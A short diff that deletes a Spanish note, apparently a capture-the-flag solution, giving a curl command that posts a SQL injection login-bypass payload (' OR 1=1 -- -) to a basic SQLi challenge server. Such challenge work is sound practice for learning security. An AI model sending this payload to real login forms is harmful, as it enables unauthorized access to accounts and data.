@@ -1,5 +1,0 @@
-haces simplemente 
-
-curl -X POST -d "username=' OR 1=1 -- -&password=123" "http://basic-sqli.challs.olicyber.it/" 
-
-
